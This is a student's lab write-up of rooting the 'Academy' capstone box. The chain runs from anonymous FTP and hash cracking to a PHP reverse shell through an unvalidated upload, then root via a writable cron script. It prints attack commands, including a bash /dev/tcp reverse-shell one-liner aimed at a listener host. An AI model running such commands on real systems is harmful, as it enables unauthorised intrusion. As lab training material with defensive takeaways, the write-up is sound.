Lab notes / Practical Ethical Hacking / Course Capstone

Academy

192.168.10.8 · Debian / Linux  Rooted

A Linux box from the course capstone. I went from anonymous FTP to a low-privilege web shell through an insecure file upload, then to root by abusing a cron job running a script I could write to.

  • vsftpd 3.0.3
  • Apache 2.4.38
  • OpenSSH 7.9p1
  • File upload→RCE
  • Cron privesc
Attack path  Anon FTP →  Crack hash →  Web login →  Upload shell →  www-data →  Writable cron →  root

01 — Reconnaissance

Mapping the attack surface

I started with a full-port service and version scan to see what the host exposed.

nmap
nmap 192.168.10.8 -A -p- -T4
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--  1 1000  1000  776 May 30  2021 note.txt
22/tcp open  ssh     OpenSSH 7.9p1 Debian
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

Three services, and two immediately stood out:

PortServiceWhy it mattered
21vsftpd 3.0.3★ Anonymous login allowed, with a note.txt sitting in the share
22OpenSSH 7.9p1An admin service to pivot to once I had credentials
80Apache 2.4.38★ A web app to enumerate for an entry point

02 — Enumeration

Reading the FTP note and cracking a hash

Anonymous FTP let me pull down note.txt without any credentials. It was a developer's message that leaked three useful things: a reminder that a password had been reused across systems, the login field the app expected, and a user's password hash.

ftp — note.txt
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere...

Login uses the StudentRegno number.
hash: xxxxxxxxxxxxxxxx

The hash looked like MD5, so I ran it against rockyou.txt with hashcat. It cracked in seconds.

hashcat
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
Status...........: Cracked
<hash>:xxxxxxx

Finding the web application

Port 80 only showed the default Apache page, so I fuzzed for hidden directories with ffuf (and cross-checked with dirb). That turned up the /academy application — the login portal the note referred to.

ffuf
ffuf -w directory-list-2.3-medium.txt -u http://192.168.10.8/FUZZ
academy                 [Status: 301]

03 — Foothold

Insecure upload to code execution

Logging into /academy with the student registration number and the cracked password gave me a profile page with a photo-upload field. It accepted any file type — no validation on extension or content — so instead of an image I uploaded a PHP reverse shell.



The bug: the upload handler trusted the client. A profile-picture feature that happily stores and serves a .php file turns "change your avatar" into remote code execution.

I used a standard PHP reverse-shell script with my listener's IP and port set, started a netcat listener, then requested the uploaded file to trigger it. That gave me a shell as the web user, www-data.

reverse shell
nc -lvnp 4444
connect to [listener] from 192.168.10.8
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

04 — Privilege escalation

From www-data to a user, then to root

With a foothold, I ran LinPEAS to enumerate privilege-escalation paths. Two findings mattered:

  • A database password sitting in the app's config.php — and, thanks to the reused-password habit from the note, it also worked for the Linux user grimmie over SSH.
  • A cron job running backup.sh from grimmie's home directory — as root, on a schedule.
linpeas — findings
[+] config.php  → $mysql_password = xxxxxxxxxx
[+] /home/grimmie/backup.sh  → run by root via cron

I logged in as grimmie over SSH using the recovered password. Because that script was owned by grimmie but executed by root, I could append a reverse-shell one-liner to it and wait for cron to run it.

backup.sh — writable, root-run
echo 'bash -i >& /dev/tcp/<listener>/<port> 0>&1' >> backup.sh
# cron fires on schedule → shell returns as root
id
uid=0(root) gid=0(root) groups=0(root)


The bug: a privileged scheduled task that runs a script a lower-privileged user can edit. Whatever that user writes, root executes.

05 — Takeaways

What the box reinforced

Enumerate everything

The whole chain started from a file anyone could read over anonymous FTP. Low-signal services still leak.

Validate uploads

Trusting client-supplied files turned a profile photo into code execution. Check type, content and where files are served from.

Password reuse chains

One reused password bridged a web login, a database and an SSH account — each step cheaper because of the last.
